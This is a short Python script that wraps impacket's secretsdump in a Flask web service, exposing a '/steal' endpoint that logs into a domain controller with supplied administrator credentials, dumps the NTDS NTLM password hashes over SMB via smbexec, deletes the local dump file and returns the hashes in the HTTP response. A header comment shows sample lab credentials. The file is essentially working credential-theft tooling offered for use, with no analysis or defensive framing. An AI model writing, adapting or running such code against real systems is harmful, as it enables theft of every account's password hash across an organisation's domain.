# {
#    "dc_ip": "192.168.152.100",
#    "target":"lab01.local/administrator:password1!@192.168.152.100"
#}

from __future__ import division
from __future__ import print_function
import argparse
import codecs
import logging
import os
import sys
from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket.smbconnection import SMBConnection
import requests
from impacket.examples.secretsdump import  RemoteOperations, NTDSHashes
from impacket.krb5.keytab import Keytab
import time
from flask import Flask
from flask import request
from flask_cors import CORS

import hashlib,binascii
try:
    input = raw_input
except NameError:
    pass

class DumpSecrets():
     def dump(self, remoteName, username='', password='', domain='',dc_ip=''):
        smbConnection = SMBConnection(remoteName, dc_ip)
        smbConnection.login(username, password, domain)

        remoteOps  = RemoteOperations(smbConnection, False, dc_ip)
        remoteOps.setExecMethod('smbexec')
        NTDSFileName = None

        dumpingTool = NTDSHashes(NTDSFileName, None, True, history=False,
                                           noLMHash=True, remoteOps=remoteOps,
                                           useVSSMethod=False, justNTLM=True,
                                           pwdLastSet=False, resumeSession=None,
                                           outputFileName='addump', justUser=None,
                                           printUserStatus= False)
        dumpingTool.dump()
        pass



app = Flask(__name__)
CORS(app)


@app.route("/steal", methods=['POST'])
def stealData():
    # get the data from the post request
    data = request.get_json()
    dc_ip = data['dc_ip']
    target = data['target']

    domain, username, password, remoteName = parse_target(target)

    


    dumper = DumpSecrets()
    dumper.dump(remoteName=remoteName, username=username, password=password,domain=domain,dc_ip=dc_ip)
   
    # read addump.ntds file
    with open('addump.ntds', 'rb') as f:
        ntds = f.read().decode("utf-8")
  
    # delete addump.ntds file
    os.remove('addump.ntds')

    return {"data": ntds}




    

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)

